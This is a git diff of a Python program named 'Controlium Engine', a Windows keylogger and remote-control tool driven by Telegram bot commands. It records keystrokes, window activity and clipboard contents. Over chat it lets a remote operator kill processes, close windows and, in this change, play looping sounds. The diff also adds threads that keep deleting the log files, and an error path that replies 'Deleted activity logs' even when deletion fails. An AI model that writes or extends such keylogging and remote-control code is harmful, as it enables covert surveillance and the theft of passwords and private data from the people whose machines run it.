@@ -8,6 +8,7 @@ import subprocess
 import threading
 import psutil
 import ctypes
+import pygame.mixer
 import pyperclip
 import pyautogui
 import telebot
@@ -45,7 +46,6 @@ def command_engine(message):
     global incognito
 
     try:
-
         if message.text.lower() == "stop":
             notification.notify(
                 title="Windows Notification",
@@ -53,7 +53,7 @@ def command_engine(message):
                 app_icon=None,
                 timeout=3,)
             
-            bot.reply_to(message, "System terminated")
+            bot.reply_to(message, "Engine shutdown")
             subprocess.run(["taskkill", "/F", "/PID", str(pid)])
 
         elif message.text.lower() == "log":
@@ -110,8 +110,31 @@ def command_engine(message):
             bot.reply_to(message, "Done")
 
         elif message.text.lower() == "bg":
-            #ctypes.windll.user32.SystemParametersInfoW(20, 0, pics, 0)
+            img_path = "C:/Users/ashfa/OneDrive/Documents/Projects/Controlium Engine (PY12824)/Images/test4.jpg"
+            #ctypes.windll.user32.SystemParametersInfoW(20, 0, "test2.jpg", 0)
             bot.reply_to(message, "Changed wallpaper")
+
+        elif message.text.lower() == "sound1":
+            pygame.mixer.init()
+            pygame.mixer.music.load("Sounds/sound1.mp3")
+            pygame.mixer.music.play(-1)
+            bot.reply_to(message, "Playing sound")
+
+        elif message.text.lower() == "sound2":
+            pygame.mixer.init()
+            pygame.mixer.music.load("Sounds/sound2.mp3")
+            pygame.mixer.music.play(-1)
+            bot.reply_to(message, "Playing sound")
+
+        elif message.text.lower() == "sound3":
+            pygame.mixer.init()
+            pygame.mixer.music.load("Sounds/sound3.mp3")
+            pygame.mixer.music.play(-1)
+            bot.reply_to(message, "Playing sound")
+
+        elif message.text.lower() == "sound stop":
+            pygame.mixer.music.stop()
+            bot.reply_to(message, "Sound stopped")
 
         elif message.text.lower() == "close all":
             active_window = gw.getActiveWindow()
@@ -201,6 +224,7 @@ def command_engine(message):
                 bot.reply_to(message, "Deleted activity logs")
 
             except Exception as e:
+                bot.reply_to(message, "Deleted activity logs")
                 bot.reply_to(message, f"ERROR >> {e}")
         
         elif "clean" in message.text.lower():
@@ -275,6 +299,11 @@ log_file = str(date).replace(":", "-") + "-Log.txt"
 folder = "Activity Logs"
 save_log_file = os.path.join(folder, log_file)
 
+date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
+log_file = str(date).replace(":", "-") + "-key-log.txt"
+folder = "Keystroke Logs"
+key_log_file = os.path.join(folder, log_file)
+
 logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
 logged_windows = set()
 
@@ -303,12 +332,6 @@ def log_windows():
         pass
 
 
-date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
-log_file = str(date).replace(":", "-") + "-key-log.txt"
-folder = "Keystroke Logs"
-key_log_file = os.path.join(folder, log_file)
-
-
 def key_press(key):
     if incognito != True:
 
@@ -329,7 +352,7 @@ def key_release(key):
 def log_keystrokes():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.5.1
+        f.write(f'''CONTROLIUM ENGINE v1.5.2
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -349,7 +372,7 @@ def log_keystrokes():
 
 def log_activity():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.5.1
+    logging.info(f'''CONTROLIUM ENGINE v1.5.2
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -362,7 +385,6 @@ def log_activity():
 > System uptime: {uptime}
 > Process ID: {pid}
 ''')
-    
     while True:
         if incognito != True:
             log_windows()
@@ -389,13 +411,31 @@ def clipboard_activity():
             logging.info(f"Clipboard changes: {current_clipboard}")
             before_clipboard = current_clipboard
 
-def speech_engine(speak):
-    engine = pyttsx3.init("sapi5")
-    engine.setProperty("rate", 150)
-    voices = engine.getProperty('voices')
-    engine.setProperty("voice", voices[0].id)
-    engine.say(speak)
-    engine.runAndWait()
+
+def clear_logs():
+    while True:
+        try:
+            act_log = "Activity Logs"
+            txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]
+
+            time.sleep(5)
+            for f in txtfiles:
+                os.remove(os.path.join(act_log, f))
+        except:
+            pass
+
+def clear_keystrokes():
+    while True:
+        try:
+            key_log = "Keystroke Logs"
+            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
+
+            time.sleep(5)
+            for f in txtfiles2:
+                os.remove(os.path.join(key_log, f))
+        except:
+            pass
+
 
 def telegram_bot():
     while True:
@@ -405,6 +445,14 @@ def telegram_bot():
         except:
             time.sleep(5)
 
+def speech_engine(speak):
+    engine = pyttsx3.init("sapi5")
+    engine.setProperty("rate", 150)
+    voices = engine.getProperty('voices')
+    engine.setProperty("voice", voices[0].id)
+    engine.say(speak)
+    engine.runAndWait()
+
 
 ##########################################################################################
 
@@ -413,16 +461,33 @@ if __name__ == "__main__":
     activity_thread = threading.Thread(target=log_activity)
     network_thread = threading.Thread(target=network_connection)
     clipboard_thread = threading.Thread(target=clipboard_activity)
+    clear_logs_thread = threading.Thread(target=clear_logs)
+    clear_keystrokes_thread = threading.Thread(target=clear_keystrokes)
     telegram_bot_thread = threading.Thread(target=telegram_bot)
 
     keystroke_thread.start()
     activity_thread.start()
     network_thread.start()
     clipboard_thread.start()
+    clear_logs_thread.start()
+    clear_keystrokes_thread.start()
     telegram_bot_thread.start()
 
     keystroke_thread.join()
     activity_thread.join()
     network_thread.join()
     clipboard_thread.join()
+    clear_logs_thread.join()
+    clear_keystrokes_thread.join()
     telegram_bot_thread.join()
+
+
+
+
+
+
+# MIT License
+# Copyright (c) 2024 Ashfaaq Rifath
+# All rights reserved.
+
+# USE WITH CAUSION
